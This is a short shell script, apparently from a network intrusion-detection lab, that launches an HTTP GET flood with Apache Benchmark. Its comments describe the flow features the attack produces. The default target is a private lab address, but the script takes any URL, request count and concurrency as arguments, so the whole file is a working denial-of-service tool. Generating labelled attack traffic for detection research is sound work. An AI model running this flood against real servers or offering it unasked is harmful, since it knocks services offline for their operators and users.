#!/bin/sh
# http_flood.sh — HTTP GET flood using Apache Benchmark.
# Unlike the SYN flood, this generates complete TCP flows with real responses:
# fwd_act_data_pkts > 0, psh_flag_cnt high, bwd_pkt_len_std > 0.
# Signature: high volume + full handshake + application-layer data.
TARGET=${1:-http://172.20.0.10/}
COUNT=${2:-10000}
CONC=${3:-100}
echo "[attack] HTTP GET flood → $TARGET  $COUNT requests  concurrency $CONC"
ab -n "$COUNT" -c "$CONC" "$TARGET"